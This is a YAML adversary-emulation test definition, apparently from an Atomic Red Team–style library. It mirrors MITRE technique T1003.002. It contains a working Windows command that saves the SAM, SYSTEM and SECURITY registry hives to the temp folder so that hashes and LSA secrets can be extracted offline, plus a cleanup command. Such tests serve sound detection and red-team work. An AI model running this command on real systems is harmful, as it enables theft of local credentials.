- requirements: []
  name: Soumaia ART Tests - Registry dump of SAM, creds, and secrets
  description: 'Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated

    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7


    Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory. (requires elevation)'
  tactic: credential-access
  technique_id: T1003.002
  technique_name: 'OS Credential Dumping: Security Account Manager'
  executors:
  - cleanup:
    - del %temp%\sam >nul 2> nul & del %temp%\system >nul 2> nul & del %temp%\security >nul 2> nul
    timeout: 60
    platform: windows
    name: cmd
    payloads: []
    parsers: []
    command: reg save HKLM\sam %temp%\sam & reg save HKLM\system %temp%\system & reg save HKLM\security %temp%\security
  id: 1ad3b745-1c61-5b62-b6dd-8b0dfbd0e78f
